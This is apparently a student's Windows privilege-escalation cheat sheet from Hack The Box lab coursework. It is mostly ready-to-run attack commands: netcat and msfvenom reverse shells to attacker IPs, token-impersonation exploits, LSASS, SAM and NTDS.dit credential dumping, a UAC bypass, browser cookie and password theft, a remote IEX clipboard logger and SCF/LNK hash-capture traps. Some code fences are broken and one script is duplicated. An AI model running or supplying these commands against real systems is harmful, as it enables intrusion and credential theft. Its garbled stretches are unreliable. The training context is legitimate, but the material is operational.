# Windows privilege escalation

## Situational Awareness

### Network info

Interesting commands to check to which other hosts our box under attack communicates with:
```
#Check interfaces to see to which network it connects
ipconfig
#Recent IP addresses our box has communicated with
arp -a
#Routing table
route print
```

### Enumerating Protections (Anti-Virus/EDR)

Check for an active windows defender:
```
Get-MpComputerStatus
```

Applocker rules:
```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

Test a certain binary to see if it has Applocker policies applicable to it:
```
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```

## Initial Enumeration

We can use tasklist to enumerate what services are running on the box:
```
tasklist /svc
```
Dump all the env variables:
```
set
```

Other usefull info such as installed KB's and so on can be obtained with the following command:
```
systeminfo
#OR
wmic qfe
#OR
Get-HotFix | ft -AutoSize
```

Get list of installed programs:
```
#With cmd
wmic product get name
#With powershell
Get-WmiObject -Class Win32_Product |  select Name, Version
```

Get listening ports on the box:
```
netstat -ano
```

Check for logged in users:
```
query user
```

Check privileges of our user:
```
whoami /priv
```
Check the groups the user is member of:
```
whoami /groups
```

Check other accounts which exist on the box:
```
net user
```

Check all the groups which exists on the host:
```
net localgroup
```

Check which users are in the `administrator` group:
```
net localgroup administrators
```

Get password policy:
```
net accounts
```

## Communication with Processes

One of the best places to look for privilege escalation is the processes that are running on the system. Even if a process is not running as an administrator, it may lead to additional privileges. The most common example is discovering a web server like IIS or XAMPP running on the box, placing an aspx/php shell on the box, and gaining a shell as the user running the web server. Generally, this is not an administrator but will often have the SeImpersonate token, allowing for Rogue/Juicy/Lonely Potato to provide SYSTEM permissions.

We could escalate priviliges from a process listening on a socket only available to the loopback adapter.. We can check if such processes exist:
```
netstat -ano
```

Communication between processes on Windows can also happen with pipes.
```
#List all pipes (sys internal tools)
pipelist.exe /accepteula
#Or in powershell
gci \\.\pipe\
#Enumerate permissions different groups have over the pipe
accesschk.exe /accepteula \\.\Pipe\lsass -v
```
## Windows Privileges Overview

pass

## SeImpersonate and SeAssignPrimaryToken

When we reach code execution on a windows server (IIS or SQL server) we can possibly 
elevate privileges by using the `SeImpersonate`privilege. Bascially it allows a connecting client hand over it privileges to the server. Normally this is used to have the server access resources only accessible to the client (file share for instance)

The JuicyPotato example:
Connect to a sql server (say we have obtained some secrets)

```
impacket-mssqlclient sql_dev@10.129.43.43 -windows-auth
```
Once connected enable `xp_cmdshell` allowing us to execute commands in the SQL query:
```
enable_xp_cmdshell
xp_cmdshell whoami
#Check privileges
xp_cmdshell whoami /priv
```

We see we have the `SeImpersonatePrivilege` privilege.
Next we can use JuicyPotato:

Setup a listener:
```
sudo nc -lnvp 8443
```

```
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.15.78 8443 -e cmd.exe" -t *
```
Basically this is spawning some DCOM process where a high privileged service (BITS Background Intelligent Transfer Service) is tricked in authentication against its DCOM server.. JuicyPotato intercepts and redirects this request and spawns a new process with these priviles:


JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. However, PrintSpoofer and RoguePotato can be used to leverage the same privileges and gain NT AUTHORITY\SYSTEM level access. This blog post goes in-depth on the PrintSpoofer tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.

Let's try PrintSpoofer:
Set up a listener:
```
nc -lnvp 8443
```
Then execute:
```
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

We have a remote shell as the NT system user

## SeDebugPrivilege

If we have this privilege we are able to for instance dump the secret hashes from LSASS:
```
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

After the dump we can use mimikatz to fetch the hashes and crack them or do Pass-the-hash attacks:
```
mimikatz.exe
log
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

Alternatively we can use this privilege to create a child process from another high privileged process.
See the poc here: https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1

We can use it like this:
```
[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")
```
First we need to look for the PID of a high privileged process:
```
tasklist


Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          4 K
System                           4 Services                   0        116 K
smss.exe                       340 Services                   0      1,212 K
csrss.exe                      444 Services                   0      4,696 K
wininit.exe                    548 Services                   0      5,240 K
csrss.exe                      556 Console                    1      5,972 K
winlogon.exe                   612 Console                    1     10,408 K
```
For instance here we can use winlogin... Next run the script like this:
```
[MyProcess]::CreateProcessFromParent(612,C:\Windows\System32\cmd.exe,"")
```

## SeTakeOwnershipPrivilege

When we have this privilege we can become owner of any securable object:
```
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                              State
============================= ======================================================= ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                                Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                          Disabled
```
We see in this case it is `Disabled`.  We can enable it using this script: https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1

Use the script like this:
```
PS C:\htb> Import-Module .\Enable-Privilege.ps1
PS C:\htb> .\EnableAllTokenPrivs.ps1
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
```

Now the privilege is enabled.
Lets use it... ! 

Say there is a file we cannot read...
```
#First take ownership of the file:
takeown /f 'C:\Departmenttake Shares\Private\IT\cred.txt'
#Then change the dacl to allow our user to read it
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
#Now read it
cat 'C:\Department Shares\Private\IT\cred.txt'
```

## Windows Built-in Groups

In case our user has the `SeBackupPrivilege' it can basically copy any file.. Even if our user does not have any ACE entry to do so...
We do have too use a special script ( https://github.com/giuliano108/SeBackupPrivilege )
```
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

```
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```
If the privilege is disabled we can enable it with:
```
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

Now we can copy any file:
```
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
```

We can also steal the NTDS.dit file from the domain controller like this.
First create a shadow copy of the C-drive:
```
PS C:\htb> diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 12:57:52 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit

PS C:\htb> dir E:


    Directory: E:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/6/2021   1:00 PM                Confidential
d-----        9/15/2018  12:19 AM                PerfLogs
d-r---        3/24/2021   6:20 PM                Program Files
d-----        9/15/2018   2:06 AM                Program Files (x86)
d-----         5/6/2021   1:05 PM                Tools
d-r---         5/6/2021  12:51 PM                Users
d-----        3/24/2021   6:38 PM                Windows
```

Then copy the `NTDS.dit` file from the shadow copy: 
```
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternatively we can use robocopy:
```
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

Once obtained we can use secretsdump to get the hashes or alternatively DSInternals:
```
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

we can also copy the registry hives and extraxt local account credentials (`secretsdump.py`):
```
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

We can use `secretsdump` to obtain the hashes:
```
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

## Windows Privilege Escalation   

If auditing of process command lines is enabled sensitive information will be stored in logs which we can retrieve with:
```
wevtutil qe Security /rd:true /f:text | Select-String "/user"
OR
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```

We can also search security logs captured by WinEvent:
```
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

## DnsAdmins

All domain controllers are also DNS-servers, if our user is a DnsAdmin he is allowed to configure DNS on that server.

A standard feature offers us to load any dll without verification.

Fist generate a dll which adds our user to the domain admins:
```
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```
Transfer the dll to the target and run:

```
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

Then the service needs to be re-started (which is not something which is allowed by DnsAdmins)...

We can check the permissions of our uses on a service with these commands:
```
wmic useraccount where name="netadm" get sid
sc.exe sdshow DNS
```
(see https://www.winhelponline.com/blog/view-edit-service-permissions-windows/)

If permitted we can start/stop the dns:
```
sc stop dns
sc start dns
```

Next we can check if we are domain admins:
```
net group "Domain Admins" /dom
```

After confirming this worked we should remove the reg key as the DNS-server will not start with the current setting:
```
reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
```


Another type of attack is creating a WPAD record where we modify to DNS so all trafic is routed to our attack box. Basically web browser will use WPAD entries to find the proxy server they need to use to route the traffic to... If we control the destination of this path all trafic is routed to our box.

To do this execute following commands:
```
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```
Then add the WPAD entry:
```
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```

## Print operators

If our uses is member of the print operator group we are allowed to load drivers. Drivers run in the kernel and have system level privileges. 
We can load a malicious driven and then via a user land application retrieve its security token elevating us to system admin.

See https://academy.hackthebox.com/module/67/section/605

xfreerdp3 /v:10.129.43.31 /u:printsvc /p:HTB_@cademy_stdnt!

## Server Operators

The Server Operators group allows members to administer Windows servers without needing assignment of Domain Admin privileges. It is a very highly privileged group that can log in locally to servers, including Domain Controllers.
Membership of this group confers the powerful SeBackupPrivilege and SeRestorePrivilege privileges and the ability to control local services.

We can check permission a group has on a service with the PsService tool from sysinternals:
```
c:\Tools\PsService.exe security AppReadiness
....
[ALLOW] BUILTIN\Server Operators
                All
```
In this case we can see the Server Operators has all permission on this server.
We can chaneg the binary path of the service to run a command which adds us to the Administrator group:
```
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```
Then we start the app:
```
sc start AppReadiness
```
It fails which is expected...
But we should be admin now, which we can confirm with:
```
net localgroup Administrators
```
Now we can dump the NTDS.dit hashes:
```
secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
```

## User account control

We can check if UAC is enabled with:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```
The UAC level we can check with:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

There are quite a few bypassed documented here: https://github.com/hfiref0x/UACME
These bypasses are OS version specific. We can check our OS-version with:
```
[environment]::OSVersion.Version
```
Our build 14393 has a flaw in the SystemPropertiesAdvanced.exe binary where it tries to import a non-existing dll `srrstr.dll` from a folder we control.
Therefore we place a malicious dll there which spawns a reverse shell... The binary at hand is auto-elevating meaning we 
essentially bypass UAC.

First let's create the dll
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.253 LPORT=8443 -f dll > srrstr.dll
```
Setup a listener:
```
nc -nlvp 8443
```

Next just execute:
```
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

We have more privileges now and have bypassed UAC.

## Weak Permissions

We can use SharpUp from the GhostPack suite of tools to check for service binaries suffering from weak ACLs.
(https://github.com/GhostPack/SharpUp/)

```
.\SharpUp.exe audit
```

Using icacls we can verify the vulnerability and see that the EVERYONE and BUILTIN\Users groups have been granted full permissions to the directory, and therefore any unprivileged system user can manipulate the directory and its contents.

```
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

Since we control the directory and can start/stop the service as a low-priviliged user we can replace the binary with a reverse shell:
```
cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
sc start SecurityService
```

Something else we can do is use `accesschk.exe` to check permission different groups/users have on the serivice (in this case the `WindscribeService` service)
```
accesschk.exe /accepteula -quvcw WindscribeService
```

If we have sufficient access we can change the `binPath` of the service to run an arbitrary command:
```
sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
```
 
 ## Unquoted Service Path

 When you don't double quote the service path Windows get confused and starts  shorter paths first, stopping as soon as it finds a valid executable.

 For instance:
 ```
BINARY_PATH_NAME :
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```
Windows would try (in that order):
```
C:\Program.exe
C:\Program Files.exe
C:\Program Files (x86)\System.exe
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

We can look for services with unquoted service paths like this:
```
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```
## Checking for Weak Service ACLs in Registry

If due to weak ACLs we are allowed to change the registry related to a service we can for instance control the `imagePath` registry entry which defined the path to the executable windows runs when the service starts...

Check to which services we have write access to the registry:
```
accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
```
For instance if we see this output:
```
RW HKLM\System\CurrentControlSet\services\ModelManagerService
    KEY_ALL_ACCESS
```
it means we can modify the registry... so we can do something like:
```
PS C:\htb> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```

## Modifiable Registry Autorun Binary

We can use WMIC to see what programs run at system startup. Suppose we have write permissions to the registry for a given binary or can overwrite a binary listed. In that case, we may be able to escalate privileges to another user the next time that the user logs in.

```
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
```
## Kernel Exploits

There exist many kernel exploits for windows, some we can try are:
```
.\HiveNightmare.exe
```
download here: https://github.com/GossiTheDog/HiveNightmare
This allows us to dump SAM, SYSTEM and SECURITY hive and crack the passwords offline. (secretsdump.py).
```
impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local
```

Another one is exploiting CVE-2021-1675 where the RpcAddPrinterDriver is exploited to gain remote code execution:
```
#Check for the Spooler service named pipe
ls \\localhost\pipe\spoolss
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```
## Enumerating Missing Patches

```
#Via powershell
systeminfo
wmic qfe list brief
Get-Hotfix
```

via cmd
```
wmic qfe list brief
```

We can then check how far behind this PC is on patches...

## CVE-2020-0668

We can leverage this exploit: [CVE-2020-0668](https://github.com/RedCursorSecurityConsulting/CVE-2020-0668)
Basically this exploit alllows us to get full control over a service so we can for example swap the binary it executes with a reverse shell.

See steps here: https://academy.hackthebox.com/module/67/section/627

## DLL injection

See website.. seems like this will not be in the exam

## Credential Hunting

Search for config files:
```
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

Looking into browser dictonaries:
```
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

### Unattended installation files

Unattended installation files: Unattended installation files may define auto-logon settings or additional accounts to be created as part of the installation. Passwords in the unattend.xml are stored in plaintext or base64 encoded.

Although these files should be automatically deleted as part of the installation, sysadmins may have created copies of the file in other folders during the development of the image and answer file.

Example filename = `Unattend.xml`

### PowerShell History File

Powershell cmd history is stored here: 
```
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt.
```
OR:
```
#Show the path to the history file
(Get-PSReadLineOption).HistorySavePath
#Print the content of the file
gc (Get-PSReadLineOption).HistorySavePath
```

Print the file for each user we are allowed to.. (handy if we have elevated privilege for further exploitation):
```
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

### Powershell credentials
PowerShell credentials are often used for scripting and automation tasks as a way to store encrypted credentials conveniently. The credentials are protected using DPAPI, which typically means they can only be decrypted by the same user on the same computer they were created on.

```
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
$credential.GetNetworkCredential().username
$credential.GetNetworkCredential().password
```

## Other files

Look for `xml`, `ini` or `txt` files containing the word `password`.

```
cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt
OR 
findstr /si password *.xml *.ini *.txt *.config
OR
findstr /spin "password" *.*
```

Or in powershell:
```
select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password
```
Search for file extensions:
```
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
OR powershell
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

### Sticky notes
sticky notes are often used for passwords and are actually a sqllite database located at:
```
C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
```
We can open this file with `DB browser for sqllite`
Or use powershell ( https://github.com/RamblingCookieMonster/PSSQLite )
```
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\PSSQLite.psd1
$db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
```
Some other files of interest could be:
```
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```

## Further Credential Theft


The cmdkey command can be used to create, list, and delete stored usernames and passwords. Users may wish to store credentials for a specific host or use it to store credentials for terminal services connections to connect to a remote host using Remote Desktop without needing to enter a password.


Find saved credentials:
```
cmdkey /list
```
We can try to RDP using this user.

Another thing we can do is run a command as this user:
```
runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

Fetch cookies and stored credentials from chrome:
```
.\SharpChrome.exe logins /unprotect
```

### Password managers

Keepass is a popular password manager where the crendetials are encrypted using a master password. We can extract the hash and attempt to crack it:
```
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx 
hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
```

### E-mail

If we gain access to a domain-joined system in the context of a domain user with a Microsoft Exchange inbox, we can attempt to search the user's email for terms such as "pass," "creds," "credentials," etc. using the tool MailSniper.

### Lazagne 

We can use lazagne as an automated tool to find credentials on a host (https://github.com/AlessandroZ/LaZagne):
```
.\lazagne.exe all
```

### Sessiongopher

Another tool we can use is Sessiongopher (https://github.com/Arvanaghi/SessionGopher):
```
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target WINLPE-SRV01
```

### Windows AutoLogon

Windows Autologon is a feature that allows a user to configure their Windows operating system to automatically log on to a specific user account, without requiring manual input of the username and password at each startup. However, once this is configured, the username and password are stored in the registry, in clear-text.

```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

### Putty proxy sessions

```
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

### Wifi passwords

Show wireless networks which were recently connected to:
```
netsh wlan show profile
```

## Citrix Breakout


If no file explorer is available we can attempt to achieve this by opening for example paint.. Then click Open and provide a UNC path:

`\\127.0.0.1\c$\users\pmorgan`

Using this approach we can also transfer files by hosting an smb server on our attack box:
```
impacket-smbserver -smb2support share $(pwd)
```
Another approach is using a custom explorer such as `Explorer++` (https://explorerplusplus.com/). We can also employ tools to change the registry in case the normal regedit tool is blocked.
Tools such as Simpleregedit, Uberregedit, SmallRegistryEditor can be used for this.

### Modifying existing shortcut files

Modify the Target of a shortcut to `C:\Windows\System\cmd.exe` to get a shell.

### Escalating Privileges

Say for example we ran `PowerUp.ps1` and we see the `Always Install Elevated` key is present and set.. Then we can:
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
Import-Module .\PowerUp.ps1
Write-UserAddMSI
```

Now we have the power to add a user in the Administrators group:
```
runas /user:backdoor cmd
```

Sometimes we still need to bypass UAC (even if we are admin), this can be done with:
```
Import-Module .\Bypass-UAC.ps1
Bypass-UAC -Method UacMethodSysprep
```

## Interacting with Users

### Sniffing the network

Sniffing credentials from the network...
We can use the tool net-creds to sniff credentials from an interface or a pcap file:
https://github.com/DanMcInerney/net-creds

### Monitoring for Process Command Lines

We can use this script to minitor for processes beeing started from the cmd line.. These could contain credentials:
```
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}
```
We can host this script on our attack box and run it on the target host as follows:
```
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}
```

### SCF on file share

A Shell Command File (SCF) is used by Windows Explorer to move up and down directories, show the Desktop, etc. An SCF file can be manipulated to have the icon file location point to a specific UNC path and have Windows Explorer start an SMB session when the folder where the .scf file resides is accessed. If we change the IconFile to an SMB server that we control and run a tool such as Responder, Inveigh, or InveighZero, we can often capture NTLMv2 password hashes for any users who browse the share. This can be particularly useful if we gain write access to a file share that looks to be heavily used or even a directory on a user's workstation. We may be able to capture a user's password hash and use the cleartext password to escalate privileges on the target host, within the domain, or further our access/gain access to other resources.

Step : Create the scf file

```
[Shell]
Command=2
IconFile=\\10.10.15.31\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```
Save it as `@Inventory.scf`... The IP address point to our attack box running responder:
```
sudo responder -wrf -v -I tun0
```

One we have captured hashes we can crack them offline with hashcat:
```
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```
Using SCFs no longer works on Server 2019 hosts, but we can achieve the same effect using a malicious .lnk file. We can use various tools to generate a malicious .lnk file, such as Lnkbomb, as it is not as straightforward as creating a malicious .scf file. We can also make one using a few lines of PowerShell.

```

$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

## Pillsaging

Pillaging is the process of obtaining information from a compromised system.

Check installed applications:
```
dir "C:\Program Files"
```

Get installed programs via powershell:
```
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```
### mRemoteNG

mRemoteNG saves connection info and credentials to a file called confCons.xml.
By default, the configuration file is located in `%USERPROFILE%\APPDATA\Roaming\mRemoteNG`.

```
ls C:\Users\julio\AppData\Roaming\mRemoteNG
```

There is a file called `confCons.xml' which contains the encrypted credentials.

if the user didn't set a custom master password, we can use the script mRemoteNG-Decrypt to decrypt the password

```
python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" 
```

Let' say we set the custom master password `admin` then we can decrypt the other passwords like this:
```
python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p admin
```

If we want to brute force the master password we can use a bash script like this:
```
for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done    
```

### Slack

Steal the cookies and authenticate too slack, see: https://academy.hackthebox.com/module/67/section/1637
From chrome cookies can be dumped with:
```
copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
Invoke-SharpChromium -Command "cookies slack.com"
```
Or in firefox copy the sqlite database located here: `copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite` to your attack box and run:
```


### Clipboard

We can start to monitor the clipboard with a custom powershell script:
```
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
Invoke-ClipboardLogger
```
python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
```

## LOLBAS

### Certutil

The LOLBAS project documents binaries, scripts, and libraries that can be used for "living off the land" techniques on Windows systems. Each of these binaries, scripts and libraries is a Microsoft-signed file that is either native to the operating system or can be downloaded directly from Microsoft and have unexpected functionality useful to an attacker


Transferring files with `certutil`:

```
certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
```

We can use the -encode flag to encode a file using base64 on our Windows attack host and copy the contents to a new file on the remote system.

```
certutil -encode file1 encodedfile
```
Then decode with:
```
certutil -decode encodedfile file2
```

### Always install elevated 

Another thing we can check for is the `Always Install Elevated` mode which can be enumerated with:
```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
```
If this is active (i.e. value=0x1) then we can exploit by creating an msi file on our attack box:
```
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
```

Setup a listener:
```
nc -lnvp 9443
```

Transfer it and then execute it:
```
msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
```

### Scheduled Tasks

We can query for scheduled tasks with:
```
schtasks /query /fo LIST /v
OR
Get-ScheduledTask | select TaskName,State
```

If we find scripts triggered by scheduled tasks we can check if we have permissions to edit them:

```
.\accesschk64.exe /accepteula -s -d C:\Scripts\
```

### User/Computer Description Field

Though more common in Active Directory, it is possible for a sysadmin to store account details (such as a password) in a computer or user's account description field. We can enumerate this quickly for local users using the Get-LocalUser cmdlet.

```
Get-LocalUser
```
Enumerate the computer description field with:
```
Get-WmiObject -Class Win32_OperatingSystem | select Description
```

### Mount VHDX/VMDK

If we find these drives we can mount them and look for interesting files like the `SAM`/ `SYSTEM` file and dump hashes.

On linux we can mount with (vmdk):
```
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
```
or with vhdx:
```
guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1
```

On windows we can use the `Disk Management` utility to mount the disk.
Once we locate the SAM/SYSTEM files we can dump the hashes with:
```
secretsdump.py -sam SAM -security SECURITY -system SYSTEM 
```